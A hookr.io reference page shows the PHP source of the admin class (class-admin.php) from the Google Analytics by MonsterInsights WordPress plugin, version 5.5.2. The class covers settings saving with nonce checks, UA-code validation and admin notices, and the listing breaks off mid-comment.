<!DOCTYPE html> <!--[if lt IE 7]><html class="hookr file lt-ie9 lt-ie8 lt-ie7 ie"><![endif]--> <!--[if IE 7]><html class="hookr file lt-ie9 lt-ie8 ie7 ie"><![endif]--> <!--[if IE 8]><html class="hookr file lt-ie9 ie8 ie"><![endif]--> <!--[if IE 9]><html class="hookr file ie9 ie"><![endif]--> <!--[if gt IE 9]><html class="hookr file gt-ie9 ie"><![endif]--><html lang="en-US" id="single" class="hookr file" data-site="plugin" data-version="5.5.2" data-slug="google-analytics-by-monsterinsights" data-type="file" data-id="10335"><head xmlns="http://www.w3.org/1999/xhtml"><title> admin-class-admin | file | Google Analytics By Monsterinsights | hookr.io</title><meta charset="UTF-8"><meta name="author" content="thepassionofthechris \m/," /><meta name="keywords" content="file, plugin, google-analytics-by-monsterinsights, 5.5.2" /><meta name="description" content="The WordPress Hook/API Index" /><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"><link rel="shortcut icon" href="http://hookr.io/wp-content/themes/hookr/assets/images/favicon.ico" /><link rel="icon" type="image/png" href="http://hookr.io/wp-content/themes/hookr/assets/images/favicon.png"><link rel="icon" type="image/gif" href="http://hookr.io/wp-content/themes/hookr/assets/images/favicon.gif"><link rel="icon" type="image/jpeg" href="http://hookr.io/wp-content/themes/hookr/assets/images/favicon.jpg"><meta name="google-site-verification" content="Q5dnl0YziNqRLCBxFtc2Rd8vUuueYAt6VIUYZItvEL4" /><script type="text/javascript">/*<![CDATA[*/window._wpemojiSettings={"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/hookr.io\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.4.13"}};!function(a,b,c){function d(a){var c,d,e,f=b.createElement("canvas"),g=f.getContext&&f.getContext("2d"),h=String.fromCharCode;return g&&g.fillText?(g.textBaseline="top",g.font="600 32px Arial","flag"===a?(g.fillText(h(55356,56806,55356,56826),0,0),f.toDataURL().length>3e3):"diversity"===a?(g.fillText(h(55356,57221),0,0),c=g.getImageData(16,16,1,1).data,g.fillText(h(55356,57221,55356,57343),0,0),c=g.getImageData(16,16,1,1).data,e=c[0]+","+c[1]+","+c[2]+","+c[3],d!==e):("simple"===a?g.fillText(h(55357,56835),0,0):g.fillText(h(55356,57135),0,0),0!==g.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag"),unicode8:d("unicode8"),diversity:d("diversity")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag&&c.supports.unicode8&&c.supports.diversity||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);/*]]>*/</script><style type="text/css">img.wp-smiley,img.emoji{display:inline !important;border:none !important;box-shadow:none !important;height:1em !important;width:1em !important;margin:0
.07em !important;vertical-align:-0.1em !important;background:none !important;padding:0
!important}</style><link rel='stylesheet' id='screen-css'  href='http://hookr.io/wp-content/themes/hookr/assets/css/hookr.css?ver=82837b897a733f0ab20c378193ab4194' type='text/css' media='screen' /><link rel='stylesheet' id='qtip-css'  href='http://hookr.io/wp-content/themes/hookr/assets/vendor/jquery.qtip.custom/jquery.qtip.min.css?ver=4.4.13' type='text/css' media='screen' /><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/fU9dGoIwDLsQW_XbHbyAXmCMAsNBsS2otxcYvqFP_UmaJg66x4T8LtzemD427BVtH4fiBC3RncGLoAp0AqWYRDS2lA4ZMw4VMZREKsp-NM46e14PlShpHJc_UwSsawz6R6CbURX38oNzDUwp3egSX1iZ3osif0PIhinVK3YQI9NsWNYRs6dAnCNt0zNWDW4OPw.js"></script><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/M9YvzdTPzS8tTtXLzcwDAA.js"></script><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/fZBBDsIwDAQ_RG1Kn8AvuKWJUQ1JHBIXVF5PKOoFKZV8Gc_KK3nAmVHNWCBwPAxfKp4d5ZWPOIncM5pSSAve6jxmygskbyxN4mvwP_Sk6KRSSJ6vS9dDD6eNGkdXbu3hV9nUs7JvSpNqrzXK0uwFKyFJpKg7V3jPwZPp1XjDm7JYz2kUk10XTFHK6LgoXqo5b-YD.js"></script><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/M9DPyM_PLtJPLC5OLSnWL0vNS8kv0s8qLE0tqtQrLMks0EsuLS7Jz0URys3MAwA.js"></script><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/M9YvzdRPTUtLTS7RzchMz8gB4hK93Mw8HQP9jPz87CL9xOLi1JJi_axiCF8vsSBTrzgzLz0nFQA.js"></script><link rel='https://api.w.org/' href='http://hookr.io/wp-json/' /><link rel="canonical" href="http://hookr.io/files/admin-class-admin/" /><link rel="alternate" type="application/json+oembed" href="http://hookr.io/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fhookr.io%2Ffiles%2Fadmin-class-admin%2F" /><link rel="alternate" type="text/xml+oembed" href="http://hookr.io/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fhookr.io%2Ffiles%2Fadmin-class-admin%2F&#038;format=xml" /><script>/*<![CDATA[*/if('undefined'===typeof Hookr)
var Hookr={};if('undefined'===typeof Hookr.Util)
Hookr.Util={};Hookr.Util=jQuery&&jQuery.extend(Hookr.Util,{"adminAjax":"http:\/\/hookr.io\/wp-admin\/admin-ajax.php","themeUrl":"http:\/\/hookr.io\/wp-content\/themes\/hookr\/","apiKey":"plugin-google-analytics-by-monsterinsights-5.5.2-file-admin-class-admin","actions":{"popover":0,"range":1,"search":2,"stat":3}});/*]]>*/</script><!--[if lt IE 9]><script src="http://hookr.io/wp-content/themes/hookr/assets/js/html5shiv.js"></script><script src="http://hookr.io/wp-content/themes/hookr/assets/js/html5shiv-printshiv.js"></script><![endif]--></head><body id="admin-class-admin" class="single single-file"><div id="gutter"><div><ul id="nav-breadcrumb" role="navigation" class="pivot clear fix"><li class="home"><a title="Go to hookr.io." href="http://hookr.io" class="home">hookr.io</a></li><li>/</li><li><span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Go to plugins." href="http://hookr.io/plugins/" class=""><span property="name">plugins</span></a><meta property="position" content="2"></span></li><li>/</li><li><span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Go to google-analytics-by-monsterin&hellip;." href="http://hookr.io/plugins/google-analytics-by-monsterinsights/" class="plugin"><span property="name">google-analytics-by-monsterin&hellip;</span></a><meta property="position" content="3"></span></li><li>/</li><li><span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Go to 5.5.2." href="http://hookr.io/plugins/google-analytics-by-monsterinsights/5.5.2/" class="H_VERSION"><span property="name">5.5.2</span></a><meta property="position" content="4"></span></li><li>/</li><li><span property="itemListElement" typeof="ListItem"><a property="item" typeof="WebPage" title="Go to files." href="http://hookr.io/plugins/google-analytics-by-monsterinsights/5.5.2/files/" class=""><span property="name">files</span></a><meta property="position" content="5"></span></li><li>/</li><li class="current_item"><span property="itemListElement" typeof="ListItem"><span property="name">admin-class-admin</span><meta property="position" content="6"></span></li></ul></div></div><header class="jv-fixed"><div> <button class="btn" data-jv-trigger="left"><span></span></button><h1 title="hookr.io"><a href="http://hookr.io" title="hookr.io"><img src="http://hookr.io/wp-content/themes/hookr/assets/images/hookr.svg" title="The WordPress Hook/API Index" alt="The WordPress Hook/API Index"/></a></h1> <nav id="nav-api-types" class="pivot clearfix" data-jv-order="0" data-jv-content="left" data-active="file"><ul role="navigation"><li class="" data-id="all" data-count="191"><a href="http://hookr.io/plugins/google-analytics-by-monsterinsights/5.5.2/all/" title="All">All <span class="count badge">191</span></a></li><li class="" data-id="new" data-count="0"><a href="http://hookr.io/plugins/google-analytics-by-monsterinsights/5.5.2/new/" title="New">New <span class="count badge">0</span></a></li><li class="" data-id="hooks" data-count="22"><a href="http://hookr.io/plugins/google-analytics-by-monsterinsights/5.5.2/hooks/" title="Hooks">Hooks <span class="count badge">22</span></a></li><li class="" data-id="action" data-count="11"><a href="http://hookr.io/plugins/google-analytics-by-monsterinsights/5.5.2/actions/" title="Actions">Actions <span class="count badge">11</span></a></li><li class="" data-id="filter" data-count="11"><a href="http://hookr.io/plugins/google-analytics-by-monsterinsights/5.5.2/filters/" title="Filters">Filters <span class="count badge">11</span></a></li><li class="" data-id="class" data-count="157"><a href="http://hookr.io/plugins/google-analytics-by-monsterinsights/5.5.2/classes/" title="Classes">Classes <span class="count badge">157</span></a></li><li class="" data-id="constant" data-count="4"><a href="http://hookr.io/plugins/google-analytics-by-monsterinsights/5.5.2/constants/" title="Constants">Constants <span class="count badge">4</span></a></li><li class="" data-id="function" data-count="8"><a href="http://hookr.io/plugins/google-analytics-by-monsterinsights/5.5.2/functions/" title="Functions">Functions <span class="count badge">8</span></a></li><li class="" data-id="shortcode" data-count="0"><a href="http://hookr.io/plugins/google-analytics-by-monsterinsights/5.5.2/shortcodes/" title="Shortcodes">Shortcodes <span class="count badge">0</span></a></li></ul> </nav> <nav id="nav-main" class="pivot" data-jv-order="1" data-jv-content="left"><ul role="navigation"><li class=""><a href="http://hookr.io/all/" title="Core">Core</a></li><li class="active"><a href="http://hookr.io/plugins/" title="Plugins">Plugins</a></li><li class=""><a href="http://hookr.io/themes/" title="Themes">Themes</a></li><li class=""><a href="http://hookr.io/features/" title="Features">Features</a></li><li class=""><a href="http://hookr.io/plugin/" title="Plugin">Plugin</a></li><li class=""><a href="http://hookr.io/about/" title="About">About</a></li><li class=""><a href="http://hookr.io/contact/" title="Contact">Contact</a></li></ul> </nav></div> </header><div role="main" id="middle"><div><div id="mainbar"> <article> <section><h1>/admin/class-admin.php</h1><p><pre><ol  class="block" start="1"><li><div>&lt;?php&nbsp;</div></li><li><div><span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment"> * @package GoogleAnalytics\Admin</span>&nbsp;</div></li><li><div><span class="comment"> */</span>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div><span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment"> * This class is for the backend, extendable for all child classes</span>&nbsp;</div></li><li><div><span class="comment"> */</span>&nbsp;</div></li><li><div>class Yoast_GA_Admin extends Yoast_GA_Options {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Constructor</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function __construct() {&nbsp;</div></li><li><div>      parent::__construct();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      add_action( 'plugins_loaded', array( $this, 'init_ga' ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      <span class="comment">// Only run admin_init when there is a cron jon executed.</span>&nbsp;</div></li><li><div>      $current_page = filter_input( INPUT_GET, 'page' );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      <span class="comment">// Only when current page is not 'wpseo'.</span>&nbsp;</div></li><li><div>      if ( strpos( $current_page, 'wpseo' ) !== 0 ) {&nbsp;</div></li><li><div>          if ( ( $this-&gt;is_running_cron() || $this-&gt;is_running_ajax() ) || strpos( $current_page, 'yst_ga' ) === 0 ) {&nbsp;</div></li><li><div>              add_action( 'admin_init', array( $this, 'init_settings' ) );&nbsp;</div></li><li><div>          }&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      add_action( 'admin_init', array( $this, 'system_info' ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Init function when the plugin is loaded</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function init_ga() {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      new Yoast_GA_Admin_Menu( $this );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      add_filter( 'plugin_action_links_' . plugin_basename( GAWP_FILE ), array( $this, 'add_action_links' ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Init function for the settings of GA</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function init_settings() {&nbsp;</div></li><li><div>      $this-&gt;options = $this-&gt;get_options();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      try {&nbsp;</div></li><li><div>          <span class="comment">// Loading Google Api Libs with minimal version 2.0.</span>&nbsp;</div></li><li><div>          new MI_Api_Libs( '2.0' );&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>      catch( Exception $exception ) {&nbsp;</div></li><li><div>          if ( $exception-&gt;getMessage() === 'required_version' ) {&nbsp;</div></li><li><div>              add_action( 'admin_notices', array( $this, 'set_api_libs_error' ) );&nbsp;</div></li><li><div>          }&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      $dashboards = Yoast_GA_Dashboards::get_instance();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      <span class="comment">// Listener for reconnecting with google analytics</span>&nbsp;</div></li><li><div>      $this-&gt;google_analytics_listener();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      if ( is_null( $this-&gt;get_tracking_code() ) && $this-&gt;show_admin_warning() ) {&nbsp;</div></li><li><div>          add_action( 'admin_notices', array( 'Yoast_Google_Analytics_Notice', 'config_warning' ) );&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      <span class="comment">// Check if something has went wrong with GA-api calls</span>&nbsp;</div></li><li><div>      $has_tracking_code = ( ! is_null( $this-&gt;get_tracking_code() ) && empty( $this-&gt;options['manual_ua_code_field'] ) );&nbsp;</div></li><li><div>      if ( $has_tracking_code && $this-&gt;show_admin_dashboard_warning() ) {&nbsp;</div></li><li><div>          Yoast_Google_Analytics::get_instance()-&gt;check_for_ga_issues();&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      if ( $_SERVER['REQUEST_METHOD'] == 'POST' ) {&nbsp;</div></li><li><div>          $this-&gt;handle_ga_post_request( $dashboards );&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">       * Show the notifications if we have one</span>&nbsp;</div></li><li><div><span class="comment">       */</span>&nbsp;</div></li><li><div>      $this-&gt;show_notification( 'ga_notifications' );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      <span class="comment">// Load the Google Analytics Dashboards functionality</span>&nbsp;</div></li><li><div>      $dashboards-&gt;init_dashboards( $this-&gt;get_current_profile() );&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * There is an error with the API libs. So show a notice.</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function set_api_libs_error() {&nbsp;</div></li><li><div>      echo '&lt;div class=&quot;error notice&quot;&gt;&lt;p&gt;' . __( 'MonsterInsights plugins share some code between them to make your site faster. As a result of that, we need all MonsterInsights plugins to be up to date. We\'ve detected this isn\'t the case, so please update the MonsterInsights plugins that aren\'t up to date yet.', 'google-analytics-for-wordpress' ) . '&lt;/p&gt;&lt;/div&gt;';&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * This function saves the settings in the option field and returns a wp success message on success</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @param array $data</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public function save_settings( $data ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      unset( $data['google_auth_code'] );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      foreach ( $data as $key =&gt; $value ) {&nbsp;</div></li><li><div>          if ( $key != 'return_tab' ) {&nbsp;</div></li><li><div>              if ( is_string( $value ) ) {&nbsp;</div></li><li><div>                  if ( $key === 'custom_code' && ! current_user_can( 'unfiltered_html' ) ) {&nbsp;</div></li><li><div>                      continue;&nbsp;</div></li><li><div>                  }&nbsp;</div></li><li><div>                  else {&nbsp;</div></li><li><div>                      $value = strip_tags( $value );&nbsp;</div></li><li><div>                  }&nbsp;</div></li><li><div>              }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>              $this-&gt;options[ $key ] = $value;&nbsp;</div></li><li><div>          }&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      <span class="comment">// Check checkboxes, on a uncheck they won't be posted to this function</span>&nbsp;</div></li><li><div>      $defaults = $this-&gt;default_ga_values();&nbsp;</div></li><li><div>      foreach ( $defaults[ $this-&gt;option_prefix ] as $option_name =&gt; $value ) {&nbsp;</div></li><li><div>          $this-&gt;handle_default_setting( $data, $option_name, $value );&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      if ( ! empty( $this-&gt;options['analytics_profile'] ) ) {&nbsp;</div></li><li><div>          $this-&gt;options['analytics_profile_code'] = $this-&gt;get_ua_code_from_profile( $this-&gt;options['analytics_profile'] );&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      $this-&gt;do_validation( $data['return_tab'] );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      if ( $this-&gt;update_option( $this-&gt;options ) ) {&nbsp;</div></li><li><div>          <span class="comment">// Success, add a new notification</span>&nbsp;</div></li><li><div>          $this-&gt;add_notification( 'ga_notifications', array(&nbsp;</div></li><li><div>              'type' =&gt; 'success', &nbsp;</div></li><li><div>              'description' =&gt; __( 'Settings saved.', 'google-analytics-for-wordpress' ), &nbsp;</div></li><li><div> ) );&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>      else {&nbsp;</div></li><li><div>          <span class="comment">// Fail, add a new notification</span>&nbsp;</div></li><li><div>          $this-&gt;add_notification( 'ga_notifications', array(&nbsp;</div></li><li><div>              'type' =&gt; 'error', &nbsp;</div></li><li><div>              'description' =&gt; __( 'There were no changes to save, please try again.', 'google-analytics-for-wordpress' ), &nbsp;</div></li><li><div> ) );&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      <span class="comment">// redirect</span>&nbsp;</div></li><li><div>      wp_redirect( admin_url( 'admin.php' ) . '?page=yst_ga_settings#top#' . $data['return_tab'], 301 );&nbsp;</div></li><li><div>      exit;&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Redirect to settings with a validation error if there are validation errors</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @param string $return_tab The tab to return to when there is a validation error.</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  protected function do_validation( $return_tab ) {&nbsp;</div></li><li><div>      $validation = $this-&gt;validate_settings();&nbsp;</div></li><li><div>      if ( is_wp_error( $validation ) ) {&nbsp;</div></li><li><div>          $this-&gt;add_notification( 'ga_notifications', array(&nbsp;</div></li><li><div>              'type' =&gt; 'error', &nbsp;</div></li><li><div>              'description' =&gt; $validation-&gt;get_error_message(), &nbsp;</div></li><li><div> ) );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>          wp_redirect( admin_url( 'admin.php' ) . '?page=yst_ga_settings#top#' . $return_tab, 301 );&nbsp;</div></li><li><div>          exit;&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Validates the settings in the `options` attribute, returns an WP_Error object on error</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @return true|WP_Error true or an error object.</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  protected function validate_settings() {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      if ( ! empty( $this-&gt;options['manual_ua_code_field'] ) ) {&nbsp;</div></li><li><div>          $this-&gt;options['manual_ua_code_field'] = trim( $this-&gt;options['manual_ua_code_field'] );&nbsp;</div></li><li><div>          <span class="comment">// en dash to minus, prevents issue with code copied from web with &quot;fancy&quot; dash</span>&nbsp;</div></li><li><div>          $this-&gt;options['manual_ua_code_field'] = str_replace( '*', '-', $this-&gt;options['manual_ua_code_field'] );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>          <span class="comment">// Regex to tests if a valid UA code has been set. Valid codes follow: &quot;UA-[4 digits]-[at least 1 digit]&quot;.</span>&nbsp;</div></li><li><div>          if ( ! preg_match( '|^UA-\d{4, }-\d+$|', $this-&gt;options['manual_ua_code_field'] ) ) {&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>              return new WP_Error(&nbsp;</div></li><li><div>                  'ua-code-format', &nbsp;</div></li><li><div>                  __( 'The UA code needs to follow UA-XXXXXXXX-X format.', 'google-analytics-for-wordpress' )&nbsp;</div></li><li><div> );&nbsp;</div></li><li><div>          }&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">       * Filters the validation for the admin options</span>&nbsp;</div></li><li><div><span class="comment">       *</span>&nbsp;</div></li><li><div><span class="comment">       * @param true|WP_Error true if the validation is successful, WP_Error on error.</span>&nbsp;</div></li><li><div><span class="comment">       * @param array $this-&gt;options The options that are being saved.</span>&nbsp;</div></li><li><div><span class="comment">       */</span>&nbsp;</div></li><li><div>      return apply_filters( 'yst_ga_admin_validate_settings', true, $this-&gt;options );&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Run a this deactivation hook on deactivation of GA. When this happens we'll</span>&nbsp;</div></li><li><div><span class="comment">   * remove the options for the profiles and the refresh token.</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  public static function ga_deactivation_hook() {&nbsp;</div></li><li><div>      <span class="comment">// Remove the refresh token and other API settings</span>&nbsp;</div></li><li><div>      self::analytics_api_clean_up();&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Handle a default setting in GA</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @param array  $data</span>&nbsp;</div></li><li><div><span class="comment">   * @param string $option_name</span>&nbsp;</div></li><li><div><span class="comment">   * @param mixed  $value</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  private function handle_default_setting( $data, $option_name, $value ) {&nbsp;</div></li><li><div>      if ( ! isset( $data[ $option_name ] ) ) {&nbsp;</div></li><li><div>          <span class="comment">// If no data was passed in, set it to the default.</span>&nbsp;</div></li><li><div>          if ( $value === 1 ) {&nbsp;</div></li><li><div>              <span class="comment">// Disable the checkbox for now, use value 0</span>&nbsp;</div></li><li><div>              $this-&gt;options[ $option_name ] = 0;&nbsp;</div></li><li><div>          }&nbsp;</div></li><li><div>          else {&nbsp;</div></li><li><div>              $this-&gt;options[ $option_name ] = $value;&nbsp;</div></li><li><div>          }&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Handle the post requests in the admin form of the GA plugin</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @param Yoast_GA_Dashboards $dashboards</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  private function handle_ga_post_request( $dashboards ) {&nbsp;</div></li><li><div>      if ( ! function_exists( 'wp_verify_nonce' ) ) {&nbsp;</div></li><li><div>          require_once( ABSPATH . 'wp-includes/pluggable.php' );&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      if ( isset( $_POST['ga-form-settings'] ) && wp_verify_nonce( $_POST['yoast_ga_nonce'], 'save_settings' ) ) {&nbsp;</div></li><li><div>          if ( ! isset ( $_POST['ignore_users'] ) ) {&nbsp;</div></li><li><div>              $_POST['ignore_users'] = array();&nbsp;</div></li><li><div>          }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>          $dashboards_disabled = Yoast_GA_Settings::get_instance()-&gt;dashboards_disabled();&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>          if ( ( $dashboards_disabled == false && isset( $_POST['dashboards_disabled'] ) ) || $this-&gt;ga_profile_changed( $_POST ) ) {&nbsp;</div></li><li><div>              $dashboards-&gt;reset_dashboards_data();&nbsp;</div></li><li><div>          }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>          <span class="comment">// Post submitted and verified with our nonce</span>&nbsp;</div></li><li><div>          $this-&gt;save_settings( $_POST );&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Is there selected an other property in the settings post? Returns true or false.</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @param array $post</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @return bool</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  private function ga_profile_changed( $post ) {&nbsp;</div></li><li><div>      if ( isset( $post['analytics_profile'] ) && isset( $this-&gt;options['analytics_profile'] ) ) {&nbsp;</div></li><li><div>          if ( $post['analytics_profile'] != $this-&gt;options['analytics_profile'] ) {&nbsp;</div></li><li><div>              return true;&nbsp;</div></li><li><div>          }&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      return false;&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Are we allowed to show a warning message? returns true if it's allowed</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @return bool</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  private function show_admin_warning() {&nbsp;</div></li><li><div>      return ( current_user_can( 'manage_options' ) && ( ! isset( $_GET['page'] ) || ( isset( $_GET['page'] ) && $_GET['page'] !== 'yst_ga_settings' ) ) );&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Are we allowed to show a warning message? returns true if it's allowed ( this is meant to be only for dashboard )</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @return bool</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  private function show_admin_dashboard_warning() {&nbsp;</div></li><li><div>      return ( current_user_can( 'manage_options' ) && isset( $_GET['page'] ) && $_GET['page'] === 'yst_ga_dashboard' );&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Transform the Profile ID into an helpful UA code</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @param integer $profile_id</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @return null</span>&nbsp;</div></li><li><div><span class="comment">   */</span>&nbsp;</div></li><li><div>  private function get_ua_code_from_profile( $profile_id ) {&nbsp;</div></li><li><div>      $profiles = $this-&gt;get_profiles();&nbsp;</div></li><li><div>      $ua_code = null;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      foreach ( $profiles as $account ) {&nbsp;</div></li><li><div>          foreach ( $account['items'] as $profile ) {&nbsp;</div></li><li><div>              foreach ( $profile['items'] as $subprofile ) {&nbsp;</div></li><li><div>                  if ( isset( $subprofile['id'] ) && $subprofile['id'] === $profile_id ) {&nbsp;</div></li><li><div>                      return $subprofile['ua_code'];&nbsp;</div></li><li><div>                  }&nbsp;</div></li><li><div>              }&nbsp;</div></li><li><div>          }&nbsp;</div></li><li><div>      }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>      return $ua_code;&nbsp;</div></li><li><div>  }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>  <span class="comment">/**</span>&nbsp;</div></li><li><div><span class="comment">   * Add a link to the settings page to the plugins list</span>&nbsp;</div></li><li><div><span class="comment">   *</span>&nbsp;</div></li><li><div><span class="comment">   * @param array $links array of links for the plugins, adapted when the current plugin is 